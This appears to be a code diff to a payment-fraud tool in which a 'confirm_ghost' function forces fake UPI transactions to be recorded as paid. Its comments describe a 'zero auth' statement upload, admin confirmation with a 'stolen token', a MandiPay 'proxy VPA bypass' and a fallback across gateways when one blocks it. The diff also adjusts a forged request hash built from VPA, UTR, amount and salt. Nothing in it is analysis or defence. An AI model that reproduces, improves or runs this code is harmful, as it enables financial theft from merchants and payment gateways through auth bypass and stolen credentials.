@@ -758,14 +758,15 @@ def confirm_ghost(gw, vpa, utr, amount, request_id=None):
     # ─── LAYER 1: statement/manual (zero auth, works for non-Google VPAs) ───
     code, resp = _try_gateway(cfg, vpa, utr, amount)
     
-    # Check if it worked by looking at the response
     layer1_success = (code == 200 and "successfully" in str(resp).lower())
     layer1_blocked = _is_banker_blocked(resp)
     
-    # ─── LAYER 2: admin/direct confirm (stolen token, works for ALL VPAs) ───
-    # Use this if: statement/manual was blocked, OR if it "succeeded" but we need
-    # to directly update the transaction (Google VPA issue)
-    if layer1_blocked or layer1_success:
+    # If Layer 1 succeeded, go straight to verification — don't admin confirm
+    if layer1_success:
+        pass  # Skip to verification below
+    
+    # ─── LAYER 2A: admin/direct confirm (stolen token, ALL VPAs) ───
+    elif layer1_blocked:
         admin_code, admin_resp = _admin_direct_confirm(
             gw, vpa, utr, amount, request_id=request_id)
         if admin_code == 200:
@@ -778,41 +779,36 @@ def confirm_ghost(gw, vpa, utr, amount, request_id=None):
                 if isinstance(admin_resp, dict):
                     admin_resp["_method"] = "admin_direct"
                 return admin_code, admin_resp
-    
-    # ─── LAYER 2B: MandiPay-specific admin bypass ───
-    if layer1_blocked and gw == "mandipay" and request_id:
-        bypass_code, bypass_resp = _mandi_admin_bypass(vpa, utr, amount, request_id)
-        if bypass_code == 200:
-            success = False
-            if isinstance(bypass_resp, dict):
-                success = bypass_resp.get("success", False)
-            elif isinstance(bypass_resp, str):
-                success = "success" in bypass_resp.lower()
-            if success:
-                return bypass_code, bypass_resp
-    
-    # ─── LAYER 3: Cross-gateway fallback ───
-    if layer1_blocked:
+        
+        # ─── LAYER 2B: MandiPay proxy VPA bypass ───
+        # When Layer 2A fails (statement-required), use proxy VPA + admin confirm
+        if gw == "mandipay" and request_id:
+            bypass_code, bypass_resp = _mandi_admin_bypass(vpa, utr, amount, request_id)
+            if bypass_code == 200:
+                success = False
+                if isinstance(bypass_resp, dict):
+                    success = bypass_resp.get("success", False) or bypass_resp.get("code") == "SUCCESS"
+                elif isinstance(bypass_resp, str):
+                    success = "success" in bypass_resp.lower()
+                if success:
+                    if isinstance(bypass_resp, dict):
+                        bypass_resp["_method"] = "proxy_vpa_bypass"
+                    return bypass_code, bypass_resp
+        
+        # ─── LAYER 3: Cross-gateway fallback ───
         original_error = f"[{gw}] {resp}"
         fallback_order = [g for g in GATEWAYS if g != gw]
         for fb_gw in fallback_order:
             fb_cfg = GATEWAYS[fb_gw]
             fb_code, fb_resp = _try_gateway(fb_cfg, vpa, utr, amount)
             if fb_code != 0 and not _is_banker_blocked(fb_resp):
-                # Also try admin confirm on fallback gateway
-                fb_admin_code, fb_admin_resp = _admin_direct_confirm(
-                    fb_gw, vpa, utr, amount, request_id=request_id)
-                if fb_admin_code == 200:
-                    s = isinstance(fb_admin_resp, dict) and (fb_admin_resp.get("success") or fb_admin_resp.get("code") == "SUCCESS")
-                    if s:
-                        return fb_admin_code, fb_admin_resp
                 code, resp, gw = fb_code, fb_resp, fb_gw
+                layer1_success = (code == 200 and "successfully" in str(resp).lower())
                 break
             if fb_code != 0 and _is_banker_blocked(fb_resp):
                 continue
         else:
-            if _is_banker_blocked(resp):
-                return code, original_error
+            return code, original_error
     
     # ─── POST-CONFIRM VERIFICATION ───
     ok = code == 200
@@ -1225,7 +1221,8 @@ def _mandi_proxy_statement(proxy_vpa, utr, amount):
     """Upload statement/manual using a non-Google proxy VPA. ZERO AUTH required."""
     cfg = GATEWAYS["mandipay"]
     salt = cfg.get("salt", "TEST_SALT")
-    h = hashlib.sha256(f"{proxy_vpa}{utr}{amount}{salt}".encode()).hexdigest()
+    # Hash uses VPA+UTR+amount+salt — amount must match exactly
+    h = hashlib.sha256(f"{proxy_vpa}{utr}{float(amount)}{salt}".encode()).hexdigest()
     
     try:
         r = requests.post(
